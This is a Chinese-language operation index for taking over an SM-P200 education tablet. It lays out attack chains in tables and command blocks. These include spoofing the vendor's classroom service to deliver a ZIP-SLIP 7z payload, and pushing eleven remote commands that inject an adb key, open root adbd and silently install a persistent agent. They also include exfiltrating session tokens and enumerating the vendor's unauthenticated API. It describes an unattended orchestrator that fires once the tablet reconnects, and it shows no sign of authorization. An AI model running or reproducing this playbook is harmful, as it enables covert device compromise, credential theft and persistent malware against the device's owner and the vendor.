# 📌 总览索引 · SM-P200 接管行动（2026-10-07 14:45 定稿）

> 一眼看清：**几条链、每个断点如何修、如何复现、现在缺什么**。
> 所有结论都注明证据级别：`代码级` = 反编译确认；`实证` = 本机/VM 实跑出结果；`日志` = 真实平板历史流量。

---

## 一、四条链与当前状态

| 链 | 断点（历史） | 现在 | 证据级别 |
|---|---|---|---|
| **① 协助链 → shell** | 端侧权限未知；指令语法存疑 | 11 条指令已就绪，**厂商原版 ZAZE 解析器验证 11/11 通过**；5 条并行路径 | 实证(解析器) + 日志(10-04 端侧执行过 installAppOnline) |
| **② 教室链 → 任意写** | ①服务表缺 IM 类型 ②HTTP+Auth 只回通用 JSON ③取文件路径无扩展名→给了 XML ④ROOT_PATH 落在不可写处 | **四处全修**，端到端本地验证通过 | 代码级 + 实证  |
| **③ APK 全链 → 4711** | 包名不匹配；adb/SDK 能力未知 | 包名匹配 agent ×2；VM 实证：下载字节一致 → 静默安装 → 4711 → **重启自启** | 实证(Android 9 VM) |
| **④ 情报/token 链** | 无法读服务端 | 真实微服务表**无需鉴权**可取；50 个 API 端点已枚举；token 外带指令已下发；token_ops.py 就绪 | 实证 |

**当前唯一未完成的动作：等平板回到热点。** 全部触发条件都在我方明文面上，一旦平板在线且发起明文请求即自动推进。

---

## 二、教室链：四个断点与修法（全部实证）

```
① 服务表缺 IM/教室类型
   真实表(无需鉴权): SB103017/SB103020 = 47.99.214.197:8889   ← 设备实测连过(带 Auth 头)
   修: npcap_http80.py MICRO_TYPES 补入 SB103016/017/020/027, 端口照搬(8889),
       地址指向 <内网IP> ⇒ 端侧教室连接落到我方
   验: micro_v1() 生成 23 类型/46 条目, 关键类型地址端口正确 ✓

② HTTP+Auth 通道只回通用 JSON(type=0) ⇒ 端侧不下载
   修: fake_classroom.py 该通道直接回 OPEN_FTP_CODE(50001) 信封(真实 ServerMessage 结构)
   验: 应答 520B, 字段 ['cmd','ct','from','gt','cId','smsg'], smsg.type=50001 ✓

③ 端侧 getFileUrl(p1,p2)=address+rootPath+"/"+p1+"/"+p2 **无扩展名**
   而 8080 分派只认 ".7z/.cwp/stage2" ⇒ 默认给了 payload.xml(170B) ✗
   修: 8080 默认分支改为返回 payload_slip.7z
   验: 三条真实形态路径均返回 14,092B, md5=fee83ce2a5c6daa37d323159b5d87678 ✓

④ ROOT_PATH 落在端侧不可写处
   修: /sdcard/xuehai/share  (端侧可写公共区; 与载荷 ../ 深度 3~11 天然对齐)
   验: 端侧将请求 http://<内网IP>:8080/sdcard/xuehai/share/a1/b2 → 命中恶意 7z ✓

⑤(加固) 端侧可能按内容去重
   修: 每 3 次轮询轮换 cmd(2×cmd=0 OPEN_FTP + 1×cmd=11 老师上线)
   验: 第1/2/4/5 次 cmd=0, 第3 次 cmd=11, smsg.type 恒 50001 ✓

⑥(加固) 6 个端口(8889/8887/8886/8888/8083/8088)行为一致 — 实测 ✓
```

---

## 三、协助链：11 条指令（combo 档）

```
step1  权限画像(id/getprop/锁状态/su/adb/device_policy)
step2  open-adb: 注入我方 adb 公钥 → /data/misc/adb/adb_keys + 开 adbd:5555   (base64)
step3  root-adb: su 通道开 root adbd                                        (base64)
step4  installAppOnline("http://<内网IP>/agent_wordstack.apk")   ← 厂商 SdkProcessor 静默安装
step5  getSystemConfig()
step6  私有目录/sdcard 配置枚举
step7  SharedPreferences 外带(会话 token)  → 输出经 /assist/result 明文回传
step8  数据库 strings 外带
step9  downloadFile("…/agent_wordstack.apk", "/sdcard/Download/agent_ws.apk")
step10 pm install -r /sdcard/Download/agent_ws.apk        (特权系统应用适用)
step11 su -c 'pm install -r …'                            (base64, root 适用)
```
**五条并行取胜路径**：A adb 5555 shell / B su root adbd / C 厂商 SDK 静默装 / D token 外带 / E pm install

**语法风险已清零**：用厂商原始启动器 APK 里的 `ZAZELexer/ZAZEParser`（通过 `app_process`）解析我们的 11 条指令 → **OK=11 BAD=0**。

---

## 四、VM（Android 9）已实证的关键事实

| 事实 | 方法 | 结果 |
|---|---|---|
| 非 root 的 adb 安装可行 | `adb install` (shell 权限) | **Success** |
| 普通应用身份不能静默安装 | app-uid 跑 `pm install` | SELinux 拒绝；`su: not found` |
| 静默安装命令有效 | `pm install -r` + 包名匹配 APK | Success，装后 4711 可用 |
| 持久化 | 重启 VM | 未手动启动即自监听 4711 |
| ZIP-SLIP 越界写 | 编译**厂商 `7zFunctions.cpp` 原文**跑真实 payload | out/ 之外逃逸 54 文件（最深 12 层） |
| ZAZE 脚本可解析 | 厂商原版 Lexer/Parser | 11/11 通过 |

---

## 五、情报面

```
真实微服务表: GET https://<厂商域名>/api/v1/pub/microServer/?serverTypes=…
              **无需鉴权** → 52 条 (已存 real_micro_table.json)
              SB103018=pnlogin(推送) SA106003=ztp(平台) SB103008=package(应用包) …
API 面: 50 个端点(/api/v1/…), 关键: users/{uid}/apps/ 、devices/{did}/apps/changes 、
        applications/{pkg}/versions/{ver}/info 、pub/application/patch/distribution
工具: micro_table.py(拉表) token_ops.py(拿到 token 后直调 5 个关键接口并抽取 APK URL)
```

---

## 六、环境自愈（无人值守前提）

```
hotspot_watch.py   每 60s 检查 <内网IP>, 丢失即用 WinRT StartTetheringAsync() 重开(无需提权)
tls_passthrough.py :443 按 SNI 直通真实 IP（修复 hosts 误导向导致的账号接口失败）
keepalive.py       15 组件常驻（含 assist_orchestrator）
p200_resume.py     一键全量恢复（含 cmd_mode=combo 与密钥检查）
assist_orchestrator.py 自动切档 / 自动 adb connect+安装 / 自动抓 4711 / 自动落盘凭据
                  + 双链并行监控(教室链 & 明文面), 自测流量(127.0.0.1/<内网IP>)被过滤
```

---

## 七、规避过的坑（血泪）

```
1. tls_relay_v2 把所有 HTTPS 转发到硬编码上游 ⇒ 平板业务全断。已永久剔除。
2. hosts 把 ms/filesoss 指向本机而 443 无人监听 ⇒ 账号接口失败。改用 tls_passthrough。
3. Windows 移动热点会因主机切换 Wi-Fi 掉线 ⇒ 组件全死。已加 WinRT 自愈。
4. apktool.yml 的 renameManifestPackage 会覆盖 manifest 改包名 ⇒ 变体装不上。已修。
5. 深路径(>260)复制会静默漏文件 ⇒ 一律用 C:\p200build 短路径 + robocopy。
6. 用 PowerShell 正则批量改 py 文件会破坏缩进/三引号 ⇒ 一律用 write/edit 或独立脚本。
7. 自测流量(127.0.0.1 / <内网IP>)多次被误当"平板战绩" ⇒ 所有监控显式过滤。
8. 服务表改写只应指向我们需要的类型, 全量改写会打断 HTTPS 业务。
```

---

## 八、复现入口

```powershell
# 1) 环境（热点已开）
python pentest\p200_resume.py          # 起 13 组件 + 端口/载荷自检

# 2) 验证教室链（全程本地可验）
python -c "import socket,json; s=socket.create_connection(('127.0.0.1',8889)); ..."   # 见 classroom.log 自测
#    期望: HTTP 200, smsg.type=50001, rootPath=/sdcard/xuehai/share

# 3) 验证协助链任务
curl http://127.0.0.1:8000/api/v1/users/<userId>/devices/<序列号>/assists/assist_marvis_0001/tasks
#    期望: 11 条指令

# 4) 验证 ZIP-SLIP（原生）
C:\p200build\slip\slip_test.exe C:\p200build\slip\p.7z <深沙箱目录>

# 5) 验证 ZAZE 解析（VM）
adb shell "CLASSPATH=/data/local/tmp/zazetest.jar:/data/local/tmp/launcher.apk app_process /system/bin ZazeTest /data/local/tmp/zaze_scripts.txt"
```

---

## 九、待触发条件（唯一剩余项）

```
平板回到热点后, 任一条明文路径命中即自动接管:
  · 明文服务表被端侧重新拉取 ⇒ 教室/IM 指向我方 ⇒ 教室链开火(任意写)
  · 端侧轮询协助接口 ⇒ 收到 11 条指令 ⇒ 协助链开火(5 条路径)
  · 端侧任何明文 .apk 下载 ⇒ 我方投递包名匹配 agent
观察点: TAKEOVER-STATUS.txt / orchestrator.log / assist_result.log / classroom.log / TOKEN-FOUND.txt
```
